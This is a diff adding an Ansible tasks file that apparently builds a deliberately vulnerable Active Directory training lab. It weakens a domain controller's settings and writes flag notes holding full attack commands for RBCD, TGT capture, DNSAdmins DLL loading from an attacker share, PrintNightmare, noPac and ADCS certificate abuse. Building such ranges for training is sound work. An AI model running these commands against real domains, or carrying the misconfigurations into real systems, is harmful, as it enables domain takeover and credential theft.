@@ -1,0 +1,180 @@
+---
+# ==============================================================================
+# vuln_lat_df_extended/tasks/domain_adv.yml — DF-041..080
+# Advanced domain attack surfaces (dc01.corp.local only)
+# ==============================================================================
+
+# DF-041: Machine Account Quota abuse — create machine accounts for RBCD
+- name: DF-041 - Verify MAQ allows machine account creation (MAQ-100 set by IA-117)
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $maq = (Get-ADDomain).MachineAccountQuota
+    if ($maq -ge 10) {
+      Write-Output "ok: MAQ=$maq — machine account creation enabled for RBCD"
+    } else {
+      Set-ADDomain -Identity (Get-ADDomain) -Replace @{'ms-DS-MachineAccountQuota'=100}
+      Write-Output "changed: MAQ set to 100"
+    }
+  register: df041_check
+  changed_when: "'changed:' in df041_check.stdout"
+  failed_when: df041_check.rc != 0
+
+# DF-042: Delegation chaining — unconstrained → constrained → S4U2Self
+- name: DF-042..048 - Configure delegation surfaces
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    # Set file01$ as unconstrained delegation target (for DF-042 PrinterBug chain)
+    $comp = Get-ADComputer -Identity 'file01' -ErrorAction SilentlyContinue
+    if ($comp -and -not ($comp.TrustedForDelegation)) {
+      Set-ADComputer -Identity 'file01' -TrustedForDelegation $true
+      Write-Output "changed: file01 set to unconstrained delegation"
+    }
+    # Set svc_web as constrained delegation to HTTP/ws01.corp.local
+    $svc = Get-ADUser -Identity 'svc_web' -Properties 'msDS-AllowedToDelegateTo' -ErrorAction SilentlyContinue
+    if ($svc) {
+      $spns = $svc.'msDS-AllowedToDelegateTo'
+      if ($spns -notcontains 'HTTP/ws01.corp.local') {
+        Set-ADUser -Identity 'svc_web' -Add @{'msDS-AllowedToDelegateTo'='HTTP/ws01.corp.local'}
+        Set-ADAccountControl -Identity 'svc_web' -TrustedToAuthForDelegation $true
+        Write-Output "changed: svc_web constrained delegation to HTTP/ws01 + protocol transition"
+      }
+    }
+    Write-Output "done"
+  register: df042_set
+  changed_when: "'changed:' in df042_set.stdout"
+  failed_when: df042_set.rc != 0
+
+# DF-049: DNSAdmins group — add svc_dns_admin for DLL injection via DNS
+- name: DF-049 - Create svc_dns_admin and add to DNSAdmins
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $u = Get-ADUser -Filter "SamAccountName -eq 'svc_dns_admin'" -ErrorAction SilentlyContinue
+    if (-not $u) {
+      $p = ConvertTo-SecureString "DnsAdmin2024!" -AsPlainText -Force
+      New-ADUser -Name 'svc_dns_admin' -SamAccountName 'svc_dns_admin' `
+        -AccountPassword $p -Enabled $true -PasswordNeverExpires $true `
+        -Path "CN=Users,DC=corp,DC=local" `
+        -Description "DF-049: DNS admin for DLL injection chain"
+      Add-ADGroupMember -Identity 'DnsAdmins' -Members 'svc_dns_admin'
+      Write-Output "changed: svc_dns_admin created and added to DnsAdmins"
+    }
+  register: df049_set
+  changed_when: "'changed:' in df049_set.stdout"
+  failed_when: df049_set.rc != 0
+
+# DF-050: Account Operators group member (lateral to Exchange/member servers)
+- name: DF-050 - Add finance_sync to Account Operators for server access
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $g = Get-ADGroup -Identity 'Account Operators' -ErrorAction SilentlyContinue
+    $m = Get-ADGroupMember -Identity 'Account Operators' -ErrorAction SilentlyContinue | Where-Object {$_.SamAccountName -eq 'finance_sync'}
+    if ($g -and -not $m) {
+      $u = Get-ADUser -Identity 'finance_sync' -ErrorAction SilentlyContinue
+      if ($u) {
+        Add-ADGroupMember -Identity 'Account Operators' -Members 'finance_sync'
+        Write-Output "changed: finance_sync added to Account Operators"
+      }
+    }
+  register: df050_set
+  changed_when: "'changed:' in df050_set.stdout"
+  failed_when: df050_set.rc != 0
+
+- name: DF-041..080 - Drop domain attack technique notes
+  ansible.windows.win_copy:
+    dest: "{{ item.path }}"
+    content: "{{ item.content }}"
+  loop:
+    - path: 'C:\Flags\FLAG-DF-041-RBCD.txt'
+      content: |
+        DF-041..045: RBCD via Machine Account Quota
+        ============================================
+        MAQ=100 allows any domain user to create up to 100 machine accounts.
+        Use this for RBCD attacks:
+
+        1. Create attacker machine account:
+           impacket-addcomputer CORP/jim.halpert:Password123!@10.10.0.10 -computer-name evil$ \
+             -computer-pass Password123!
+
+        2. Configure RBCD on target (jim.halpert needs GenericWrite on target — check LAT-030):
+           impacket-rbcd CORP/jim.halpert:Password123!@10.10.0.10 \
+             -action write -delegate-to file01$ -delegate-from evil$
+
+        3. S4U2Self + S4U2Proxy:
+           impacket-getST CORP/evil$:Password123!@10.10.0.10 \
+             -spn cifs/file01.corp.local -impersonate Administrator
+
+    - path: 'C:\Flags\FLAG-DF-042-UnconstrainedDel.txt'
+      content: |
+        DF-042..046: Unconstrained Delegation TGT Capture
+        ===================================================
+        file01$ has unconstrained delegation (TrustedForDelegation=True).
+        Any user authenticating to file01 (via Kerberos) sends their TGT.
+
+        Attack chain:
+          1. Coerce DC01 computer account to auth to file01 (SpoolSample/PetitPotam)
+          2. Capture dc01$ TGT from LSASS on file01
+          3. Use dc01$ TGT to DCSync corp.local
+
+          Rubeus monitor /interval:5 /filteruser:dc01$   (on file01)
+          SpoolSample.exe dc01.corp.local file01.corp.local  (from attacker)
+          Rubeus ptt /ticket:$(captured_tgt)
+          secretsdump -just-dc CORP/dc01$@10.10.0.10 -k -no-pass
+
+    - path: 'C:\Flags\FLAG-DF-049-DNSAdmins.txt'
+      content: |
+        DF-049: DNSAdmins DLL Injection
+        ==================================
+        svc_dns_admin is in DnsAdmins group.
+        DnsAdmins can configure the DNS server to load an arbitrary DLL.
+
+        Attack:
+          dnscmd dc01.corp.local /config /serverlevelplugindll \\attacker\share\evil.dll
+          sc stop dns  # DNS service loads DLL on restart with SYSTEM privs
+          sc start dns
+
+        dnscmd.exe is available on domain controllers.
+        Tested: Windows Server 2016-2022.
+
+    - path: 'C:\Flags\FLAG-DF-055-PrintNightmare.txt'
+      content: |
+        DF-055: PrintNightmare (CVE-2021-34527) Chain
+        ===============================================
+        Spooler enabled on DCs (DF-011 + REC-007).
+        Exploit PrintNightmare for SYSTEM on dc01:
+
+          python3 CVE-2021-34527.py CORP/jim.halpert:Password123!@10.10.0.10 \
+            '\\attacker\share\evil.dll'
+
+        Combined with DCSync (CRED-013 svc_darryl) or PTT (CRED-099):
+          Full domain compromise in < 5 steps from low-priv user.
+
+    - path: 'C:\Flags\FLAG-DF-060-noPac.txt'
+      content: |
+        DF-060: noPac / SamAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)
+        ===========================================================================
+        CVE-2021-42278: Machine accounts can rename themselves to existing accounts
+        CVE-2021-42287: KDC issues PAC as domain account when sAMAccountName spoofed
+
+        Pre-req: MAQ > 0 (DF-041: MAQ=100 in lab), low-priv domain account
+        Impact: Instant DA from any domain user
+
+        python3 noPac.py corp.local/jim.halpert:Password123! -dc-ip 10.10.0.10 \
+          --impersonate Administrator -shell
+
+    - path: 'C:\Flags\FLAG-DF-070-ADCS-ESC.txt'
+      content: |
+        DF-070..080: ADCS ESC Attack Chains (forest compromise via PKI)
+        =================================================================
+        All ADCS templates in the lab are exploitable. Cross-forest enrollment:
+
+        ESC1 (SAN forgery) → Domain Admin cert:
+          certipy req -u jim.halpert@corp.local -p Password123! -dc-ip 10.10.0.10 \
+            -target ca01.corp.local -ca 'corp-CA' -template UserTemplate \
+            -upn administrator@corp.local -out admin
+
+          certipy auth -pfx admin.pfx -dc-ip 10.10.0.10
+          # Returns TGT as Administrator
+
+        ESC8 (NTLM relay → ADCS enrollment):
+          ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
+            --adcs --template DomainController
